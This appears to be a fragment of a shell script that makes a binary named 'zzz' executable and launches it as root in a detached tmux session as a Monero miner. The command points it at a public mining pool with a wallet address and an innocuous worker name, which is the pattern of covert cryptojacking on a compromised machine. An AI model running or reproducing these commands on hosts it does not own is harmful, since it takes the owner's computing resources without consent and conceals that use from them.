...
sudo chmod +x zzz
tmux new-session -d -s a 'sudo ./zzz -o pool.supportxmr.com:3333 -u 4BGmSpeCKjogeDoSBLsx371MAXjiK676FcqfJ3hruYbFZnizUecid4v6rRW5eimdHeMQL7kKtc8HEUN94sTXYutk6gFw1gB -p graphcheck --max-cpu-usage 50 --donate-level 0 --nicehash --randomx-1gb-pages '
